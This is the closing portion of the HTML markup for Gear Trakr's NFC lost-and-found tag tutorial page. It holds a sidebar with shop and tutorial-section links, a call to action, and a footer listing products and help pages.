          </div>
        </a>
      </div>
    </div>

  </main>

  <!-- SIDEBAR -->
  <aside class="sidebar">

    <!-- Buy Widget -->
    <div class="widget">
      <div class="widget-header">🏷️ Get Your Tags</div>
      <div class="widget-body">
        <div class="tag-visual">
          <div class="tag-visual-circle">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#F4A614" stroke-width="1.8"/><path d="M8 12h8M12 8v8" stroke="#F4A614" stroke-width="1.8" stroke-linecap="round"/></svg>
          </div>
          <p>NFC Tags from $14.99</p>
        </div>
        <a href="https://geartrakr.com/#shop" class="widget-cta-btn">Shop Now</a>
        <a href="https://geartrakr.com/" class="widget-cta-btn outline">← Back to Home</a>
      </div>
    </div>

    <!-- Tutorial Nav -->
    <div class="widget">
      <div class="widget-header">📖 Tutorial Sections</div>
      <div class="widget-body" style="padding:0.5rem 0;">
        <ul class="widget-nav">
          <li><a href="#section-download" class="current">1. Download the App</a></li>
          <li><a href="#section-write">2. Write to Tag</a></li>
          <li><a href="#section-read">3. Read a Found Tag</a></li>
          <li><a href="#section-erase">4. Erase a Tag</a></li>
          <li><a href="#section-tips">5. Tips &amp; Practices</a></li>
          <li><a href="#section-faq">6. FAQ</a></li>
        </ul>
      </div>
    </div>

    <!-- Progress -->
    <div class="widget">
      <div class="widget-header">📊 Tutorial Progress</div>
      <div class="widget-body">
        <p>You're reading the complete Gear Trakr app guide.</p>
        <div class="progress-bar"><div class="progress-fill" style="width:100%"></div></div>
        <div class="progress-label"><span>6 sections</span><span>~8 min read</span></div>
      </div>
    </div>

    <!-- Quick Links -->
    <div class="widget">
      <div class="widget-header">🔗 Quick Links</div>
      <div class="widget-body" style="padding:0.5rem 0;">
        <ul class="widget-nav">
          <li><a href="https://geartrakr.com/">🏠 Home</a></li>
          <li><a href="https://geartrakr.com/#shop">🛒 Shop Tags</a></li>
          <li><a href="https://geartrakr.com/#how-it-works">⚙️ How It Works</a></li>
          <li><a href="https://geartrakr.com/#about">📬 Contact Us</a></li>
        </ul>
      </div>
    </div>

  </aside>
</div>

<!-- BOTTOM CTA -->
<section class="bottom-cta">
  <div class="bottom-cta-inner">
    <h2>Ready to Protect Your Gear?</h2>
    <p>Now that you know how it works, grab your tags and start protecting everything your family owns.</p>
    <div class="bottom-cta-btns">
      <a href="https://geartrakr.com/#shop" class="btn-yellow">Shop Tags Now</a>
      <a href="https://geartrakr.com/" class="btn-ghost">← Back to Home</a>
    </div>
  </div>
</section>

<!-- FOOTER -->
<footer>
  <div class="footer-top">
    <div>
      <a href="https://geartrakr.com/" class="footer-logo">GEAR<span>TRAKR</span></a>
      <p class="footer-desc">Smart NFC lost &amp; found tags designed for families, schools, and golf courses. Bring your gear home.</p>
    </div>
    <div class="footer-col">
      <h4>Products</h4>
      <ul>
        <li><a href="https://geartrakr.com/#shop">NFC Tags</a></li>
        <li><a href="https://geartrakr.com/#shop">Sticker Labels</a></li>
        <li><a href="https://geartrakr.com/#shop">Family Pack</a></li>
        <li><a href="https://geartrakr.com/#shop">Bulk / Partners</a></li>
      </ul>
    </div>
    <div class="footer-col">
      <h4>Help</h4>
      <ul>
        <li><a href="https://geartrakr.com/tutorial/">Tutorial</a></li>
        <li><a href="https://geartrakr.com/#how-it-works">How It Works</a></li>
        <li><a href="https://geartrakr.com/#about">Contact</a></li>
      </ul>
    </div>
    <div class="footer-col">
      <h4>Company</h4>
      <ul>
        <li><a href="https://geartrakr.com/">About Us</a></li>
        <li><a href="https://geartrakr.com/">Privacy Policy</a></li>
        <li><a href="https://geartrakr.com/">Terms of Use</a></li>
      </ul>
    </div>
  </div>
  <div class="footer-bottom">
    <span>© 2026 Gear Trakr. All rights reserved.</span>
    <span>Powered by WordPress</span>
  </div>
</footer>

</body>
</html>